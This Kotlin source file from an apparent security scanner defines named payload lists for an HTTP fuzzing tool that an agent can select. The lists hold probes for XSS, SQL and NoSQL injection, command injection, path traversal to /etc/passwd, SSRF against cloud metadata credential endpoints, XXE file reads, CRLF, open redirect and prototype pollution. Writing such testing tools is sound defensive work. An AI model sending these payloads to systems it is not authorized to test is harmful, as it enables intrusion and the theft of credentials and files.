package io.bitbytelab.raijin.core

/**
 * Built-in, non-destructive detection payload sets for `http_fuzz`, so an agent
 * can say `payload_library: "sqli"` instead of hand-supplying payloads. These
 * are standard probe strings (error/reflection/time-based), not exploits.
 */
object PayloadLibraries {

    private val libs: Map<String, List<String>> = mapOf(
        "xss" to listOf(
            "<script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "'><svg/onload=alert(1)>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "\"><img src=x onerror=alert(1)>",
            "'-alert(1)-'"
        ),
        "sqli" to listOf(
            "'",
            "''",
            "' OR '1'='1",
            "' OR 1=1-- -",
            "\" OR \"1\"=\"1",
            "1' ORDER BY 1-- -",
            "' UNION SELECT NULL-- -",
            "' AND SLEEP(5)-- -",
            "1) AND SLEEP(5)-- -",
            "';WAITFOR DELAY '0:0:5'-- -",
            "' AND pg_sleep(5)-- -",
            // Comment-truncation payloads (above) never reach the sleep call when the value is
            // concatenated BETWEEN two string literals rather than terminating a clause — these
            // close-then-reopen the string instead, for that insertion context (e.g. a cookie
            // value used as `... WHERE col = 'x' || :value || 'y'`).
            "x'||pg_sleep(5)||'",
            "'||pg_sleep(5)||'",
            "x' AND SLEEP(5) AND 'x'='x",
            "x';WAITFOR DELAY '0:0:5'--",
            "'||(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM dual)||'",
            // An unquoted numeric value has no quote or parenthesis to close.
            "1 AND 1=1",
            "1 AND 1=2",
            "1 AND SLEEP(5)",
            "1 AND 1=(SELECT 1 FROM pg_sleep(5))",
            "1;WAITFOR DELAY '0:0:5'-- -"
        ),
        "traversal" to listOf(
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini"
        ),
        "ssti" to listOf(
            "{{7*7}}",
            "\${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "{{7*'7'}}",
            "\${{7*7}}",
            "*{7*7}"
        ),
        "cmdi" to listOf(
            ";id",
            "|id",
            "||id",
            "&&id",
            "\$(id)",
            "`id`",
            ";sleep 5",
            "| sleep 5",
            "%0aid"
        ),
        "ssrf" to listOf(
            "http://127.0.0.1/",
            "http://localhost/",
            "http://127.0.0.1:22/",
            "http://127.0.0.1:6379/",
            "http://[::1]/",
            "http://0.0.0.0/",
            // The loopback address in forms a naive deny-list misses: short, decimal, hex, octal.
            "http://127.1/",
            "http://2130706433/",
            "http://0x7f000001/",
            "http://017700000001/",
            // Public names that resolve to loopback.
            "http://localtest.me/",
            "http://127.0.0.1.nip.io/",
            // Cloud metadata services: AWS, GCP, Azure, Alibaba.
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://100.100.100.200/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:6379/_INFO",
            "dict://127.0.0.1:6379/info"
        ),
        "xxe" to listOf(
            "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
            "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///c:/windows/win.ini\">]><r>&x;</r>",
            "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><r>&x;</r>",
            "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><r>&x;</r>",
            // Parameter entity: fetched while the DTD is parsed, even if no entity is echoed.
            "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"http://127.0.0.1/x.dtd\"> %p;]><r/>",
            // Internal entities only: shows DTD processing without any external fetch.
            "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY a \"xxe\"><!ENTITY b \"&a;-&a;\">]><r>&b;</r>",
            // For a value copied into a server-side document, where no DOCTYPE can be set.
            "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&x;</text></svg>"
        ),
        "crlf" to listOf(
            "%0d%0aX-Injected:%20raijin",
            "%0aX-Injected:%20raijin",
            "%0dX-Injected:%20raijin",
            "%0d%0aSet-Cookie:%20raijin=1",
            "%0d%0aLocation:%20https://example.com/",
            // Ends the header block: what follows becomes the response body.
            "%0d%0a%0d%0a<raijin>",
            // Characters whose low bytes are LF and CR once truncated to one byte.
            "%E5%98%8A%E5%98%8DX-Injected:%20raijin",
            // For a value that is decoded twice.
            "%250d%250aX-Injected:%20raijin",
            // JSON escapes, for a value inside a JSON string.
            "\\r\\nX-Injected: raijin"
        ),
        "nosqli" to listOf(
            "'",
            "\"",
            "\\",
            "'\"`{ ;\$Foo}",
            // Server-side JavaScript (`$where`) conditions and a delay.
            "' || '1'=='1",
            "' && '1'=='2",
            "'; return true; var x='",
            "';sleep(5000);'",
            // Operator objects, for a JSON value.
            "{\"\$ne\":null}",
            "{\"\$gt\":\"\"}",
            "{\"\$regex\":\".*\"}",
            "{\"\$where\":\"sleep(5000)\"}",
            // Bracket syntax, placed right after a parameter name: user[$ne]=x.
            "[\$ne]=x",
            "[\$gt]=",
            "[\$regex]=.*"
        ),
        "open_redirect" to listOf(
            "https://example.com/",
            "//example.com/",
            "/\\example.com/",
            "\\/\\/example.com/",
            "////example.com/",
            "https:example.com",
            "/%09/example.com/",
            "/%2f%2fexample.com/",
            "/%5cexample.com/",
            "//example.com%2f..",
            "https://example.com%2f%2e%2e",
            "javascript:alert(1)"
        ),
        "prototype_pollution" to listOf(
            // Query/form syntax.
            "__proto__[raijin]=polluted",
            "__proto__.raijin=polluted",
            "constructor[prototype][raijin]=polluted",
            "constructor.prototype.raijin=polluted",
            // Survives a filter that strips "__proto__" once.
            "__pro__proto__to__[raijin]=polluted",
            // JSON bodies.
            "{\"__proto__\":{\"raijin\":\"polluted\"}}",
            "{\"constructor\":{\"prototype\":{\"raijin\":\"polluted\"}}}",
            // Server-side gadgets with a visible effect: response status, JSON indentation, exposed headers.
            "__proto__[status]=510",
            "{\"__proto__\":{\"status\":510}}",
            "{\"__proto__\":{\"json spaces\":10}}",
            "{\"__proto__\":{\"exposedHeaders\":[\"raijin\"]}}"
        )
    )

    /** Returns the payload list for [name] (case-insensitive), or null if unknown. */
    fun get(name: String): List<String>? = libs[name.lowercase().trim()]

    fun names(): List<String> = libs.keys.toList()
}
